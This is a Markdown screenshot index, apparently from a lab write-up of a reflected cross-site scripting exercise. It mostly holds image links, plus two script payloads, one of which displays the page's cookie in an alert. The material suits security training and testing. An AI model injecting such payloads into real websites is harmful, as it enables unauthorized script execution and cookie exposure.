# Screenshots

## 1. Vulnerable Page

![Page](screenshots/01-xss-page.png)

---

## 2. Burp Request

![Burp](screenshots/02-burp-request.png)

---

## 3. Source Code

![Source](screenshots/03-html-source.png)

---

## 4. XSS Payload

```html
<script>alert(1)</script>
```

![Payload](screenshots/04-payload-alert.png)

---

## 5. Server Response

![Response](screenshots/05-response-script.png)

---

## 6. Cookie Payload

```html
<script>alert(document.cookie)</script>
```

![Cookie Payload](screenshots/06-cookie-payload.png)

---

## 7. Browser Alert

![Alert](screenshots/07-alert-box.png)

---

## 8. Cookie Disclosure

![Cookie](screenshots/08-cookie-popup.png)
